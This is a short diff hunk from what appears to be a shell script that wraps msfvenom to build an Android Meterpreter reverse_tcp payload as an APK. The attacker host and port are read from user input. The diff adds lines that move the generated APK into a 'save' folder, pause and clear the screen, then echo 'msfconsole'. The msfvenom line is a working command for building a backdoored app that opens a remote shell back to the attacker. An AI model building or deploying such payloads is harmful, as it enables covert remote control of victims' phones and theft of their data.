@@ -11,7 +11,9 @@ read -p "Enter payload name: " n3
 
 # Generate Metasploit payload
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$n1 LPORT=$n2 -o $n3.apk
-
+mv $n3.apk save
+sleep 3
+clear
 # Display Metasploit commands
 echo "msfconsole"
 
